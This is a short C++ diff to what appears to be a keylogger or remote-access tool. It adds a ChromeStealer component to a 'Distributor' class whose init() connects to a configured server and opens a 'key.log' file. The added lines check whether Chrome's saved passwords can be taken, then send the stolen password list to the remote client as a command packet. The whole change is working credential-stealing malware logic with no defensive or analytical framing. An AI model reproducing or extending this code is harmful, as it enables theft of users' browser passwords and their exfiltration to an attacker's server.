@@ -1,4 +1,5 @@
 #include "Distributor.h"
+#include "ChromeStealer.h"
 
 Distributor::Distributor(void)
 {
@@ -12,6 +13,7 @@ void Distributor::init(void)
 {
 	std::string ip, port;
 	XMLReader config;
+	ChromeStealer Steal;
 
 	try {
 		config.readFromFile(StaticTools::GetProjectResourceDirectory() + "\\config.xml");
@@ -31,6 +33,9 @@ void Distributor::init(void)
 
 		_client->run();
 		_log.open(StaticTools::GetProjectResourceDirectory() + "\\key.log");
+		if (Steal.canSteal()) {
+			*_client << _client->createPacket(PacketType::PT_Command, Steal.stealPasswordList());
+		}
 	}
 	catch (std::exception const& e) {
 		throw (std::runtime_error(e.what()));
